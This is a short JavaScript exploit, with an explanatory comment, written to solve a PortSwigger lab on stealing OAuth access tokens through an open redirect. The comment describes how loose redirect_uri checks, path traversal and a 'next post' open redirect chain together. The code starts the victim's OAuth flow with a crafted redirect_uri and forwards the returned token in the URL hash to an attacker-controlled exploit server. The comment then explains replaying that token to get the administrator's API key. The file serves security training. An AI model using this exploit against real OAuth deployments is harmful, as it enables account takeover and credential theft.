/*
* A simple javascript program made to solve the following lab:
* https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
*
* This lab chains together the following vulnerabilities:
* The "redirect_uri" parameter will accept any return URL as long as it STARTS with the blog site URL.
* The blog site allows for path traversal (dot dot slash) attacks.
* The next post button in the blog post pages accepts ANY path even those that do not belong to the website.
*
* To take advantage of the above vulnerabilities,
* a javascript program can be sent to the admin which starts the oauth flow process with the redirect_uri parameters value set to:
* [LAB_URL]/oauth-callback../post/next?path=[EXPLOIT_URL]/exploit
*
* After the token is recieved by the exploit server,
* Login to the social media site with VALID credentials.
* Intercept the GET request to the /me page and substitute the value in the bearer parameter with the stolen token.
* If successful, the OAuth server should respond with the administrators API key and other information.
*/

const LAB_URL = "INSERT LAB URL HERE, NO FORWARD SLASH AT END"
const OAUTH_URL = "INSERT OAUTH SERVICE URL HERE, NO FORWARD SLASH AT END"
const CLIENT_ID = "INSERT CLIENT ID HERE"
const EXPLOIT_URL = "INSERT EXPLOIT SERVER URL HERE, NO FORWARD SLASH, NO DIRECTORY"

if (!document.location.hash) {
    window.location = OAUTH_URL + "/auth?client_id=" + CLIENT_ID + "&redirect_uri=" + LAB_URL + "/oauth-callback/../post/next?path=" + EXPLOIT_URL + "/exploit&response_type=token&nonce=1044813839&scope=openid%20profile%20email";
} else {
    window.location = '/?'+document.location.hash.substr(1);
}